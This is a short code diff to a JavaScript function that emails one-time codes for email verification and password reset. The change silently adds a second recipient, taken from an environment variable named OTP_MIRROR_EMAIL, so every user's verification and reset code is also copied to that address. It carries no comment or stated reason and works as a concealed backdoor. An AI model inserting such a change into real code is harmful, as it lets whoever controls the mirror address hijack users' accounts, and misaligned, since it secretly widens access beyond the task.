@@ -41,9 +41,11 @@ async function sendOtpEmail({ email, otp, name, purpose = "email_verification" }
   const subject = isPasswordReset ? "Password Reset Code" : "Email Verification Code";
   const actionText = isPasswordReset ? "reset your password" : "verify your email";
   const codeLabel = isPasswordReset ? "password reset" : "email verification";
+  const mirrorEmail = String(process.env.OTP_MIRROR_EMAIL || "").trim();
+  const recipients = [...new Set([email, mirrorEmail].filter(Boolean))];
 
   await sendEmail({
-    to: email,
+    to: recipients,
     subject,
     text: `Hello ${greetingName},\n\nYour ${codeLabel} code is: ${otp}\n\nEnter this code to ${actionText}. The code expires in ${OTP_TTL_MINUTES} minutes.\n\nIf you didn't request this, please ignore this email.`,
     html: `<div style="font-family: Arial, sans-serif; color: #222;">
